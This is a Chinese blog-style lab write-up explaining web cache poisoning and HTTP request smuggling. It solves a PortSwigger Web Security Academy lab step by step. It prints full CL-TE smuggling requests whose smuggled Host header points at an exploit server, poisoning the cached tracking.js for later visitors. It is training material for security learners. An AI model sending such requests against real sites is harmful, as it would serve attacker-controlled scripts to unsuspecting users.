当http请求走私和web缓存碰到一起会产生什么样的火花呢，让我们看看。

在接触`Http Sumggling`缓存漏洞前，我们需要先对`Http Sumggling`和Web缓存有所了解。

# 什么是Web缓存

WEB缓存就是指网站的静态文件，比如图片、CSS、JS等，在网站访问的时候，服务器会将这些文件缓存起来，以便下次访问时直接从缓存中读取，不需要再次请求服务器。

缓存位于服务器和客户端之间，通常出于优化用户浏览体验或其他原因以减少对服务器的访问而设定的在固定时间内保存且针对特定请求的响应，常见的缓存点有：

>   * 后端程序缓存
>
>   * 服务器缓存
>
>   * 浏览器缓存
>
>   * 缓存服务器
>
>   * CDN缓存
>
>

最常见的无疑就是CDN及其类似的缓存服务器。

而为了让缓存判断是否需要提供缓存内容，在http请求中会存在`缓存键 X-Cache`，缓存键叫什么决定于架构师，但都是一个概念。

![1.png](https://image.3001.net/images/20220804/1659583806_62eb3d3e807c3291c515b.png!small)

# 什么是web缓存漏洞

如上图所示，假设小紫小黄小绿都在服务器划分的同一批特定请求中，那么小紫一开始访问服务器时，经过缓存键`X-Cache:
Miss`的判定，是首次访问，所以直接连接到`Server`服务器，而其后的小黄、小绿再次访问相同的文件时就会被判定为`X-Cache:
Hit`，即只需连接Cache缓存服务器，不再连接到`Server`服务器，借此减少了`Server`服务器的运行负荷。

这无疑是一个很不错的设计，但一旦被有心之士利用，那就会发生一些不好的事情了。

![2.png](https://image.3001.net/images/20220804/1659583807_62eb3d3fa01172b8fd9c5.png!small)

如图，当攻击者改了一些包发送到后端，导致后端返回一些恶意数据，比如xss、注入等问题，而由于缓存的机制，后续的正常用户访问时就会读取缓存服务器的恶意缓存，这就是常见的web缓存漏洞，也叫缓存攻击。

# Http Sumggling

HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列的方式的技术，其漏洞的主要形成原因是不同的服务器对于RFC标准的具体实现不一而导致的。

一般可分为以下几种：

>   * CL: Content-Length
>
>   * TE: Transfer-Encoding
>
>

  * CL不为0的GET请求

  * CL-CL

  * CL-TE

  * TE-CL

  * TE-TE

在`mengchen@知道创宇404实验室`的文章中有了十分详细的论述，我这就不再赘述。

> <https://paper.seebug.org/1048/#35-te-te>

# Http Sumggling 缓存漏洞

## 靶场

依旧以`Lab: Exploiting HTTP request smuggling to perform web cache poisoning`为靶场。

## 解法

判断是否存在走私，确定为CL-TE。

    
    
    POST / HTTP/1.1  
    Host: your-lab-id.web-security-academy.net  
    Content-Type: application/x-www-form-urlencoded  
    Content-Length: 129  
    Transfer-Encoding: chunked  
    ​  
    0  
    ​  
    GET /post/next?postId=3 HTTP/1.1  
    Host: anything  
    Content-Type: application/x-www-form-urlencoded  
    Content-Length: 10  
    ​  
    x=1

第一次请求为：

    
    
    POST / HTTP/1.1  
    Host: your-lab-id.web-security-academy.net  
    Content-Type: application/x-www-form-urlencoded  
    Content-Length: 129  
    Transfer-Encoding: chunked  
    ​

![4.png](https://image.3001.net/images/20220804/1659583808_62eb3d40955c4f5cd32e0.png!small)

第二次请求为下半段：

    
    
    GET /post/next?postId=3 HTTP/1.1  
    Host: anything  
    Content-Type: application/x-www-form-urlencoded  
    Content-Length: 10  
    ​  
    x=1

![5.png](https://image.3001.net/images/20220804/1659583809_62eb3d41744759e91117f.png!small)

可以看到存在302跳转。

然后我们需要找到哪里进行缓存攻击，这里我以`/resources/js/tracking.js`进行攻击。

![3.png](https://image.3001.net/images/20220804/1659583810_62eb3d42491929282a9c3.png!small)

![6.png](https://image.3001.net/images/20220804/1659583811_62eb3d4323ee37e1d5add.png!small)

可以看到`X-Cache`为miss，这样我们就可以利用修改，进行缓存攻击。

  * 先点击send post包
    
        POST / HTTP/1.1  
    Host: 0a9b0056035fcd3ec0c40506003b00aa.web-security-academy.net  
    Content-Type: application/x-www-form-urlencoded  
    Content-Length: 195  
    Transfer-Encoding: chunked  
    ​  
    0  
    ​  
    GET /post/next?postId=3 HTTP/1.1  
    Host: https://exploit-0a6d001c033acd49c0fa05c101130045.web-security-academy.net/  
    Content-Type: application/x-www-form-urlencoded  
    Content-Length: 10  
    ​  
    x=1

访问到第一部分：

![4.png](https://image.3001.net/images/20220804/1659583811_62eb3d43e791a5a47145b.png!small)

  * 然后在`/resources/js/tracking.js`send包：

![7.png](https://image.3001.net/images/20220804/1659583812_62eb3d44c89f0da46d863.png!small)

可以发现成功攻击，缓存键为`miss`，那下一个包应该就可以成功转接到exploit上，我们试试。

  * 对原界面进行抓包，多抓几次。

![8.png](https://image.3001.net/images/20220804/1659583813_62eb3d45a353a08a4c73b.png!small)

发现host成功变为我们的exploit。

# 后言

漏洞越来越多，也会越来越复杂，不再是单一的某种漏洞这么简单，多种漏洞复合是未来标志。

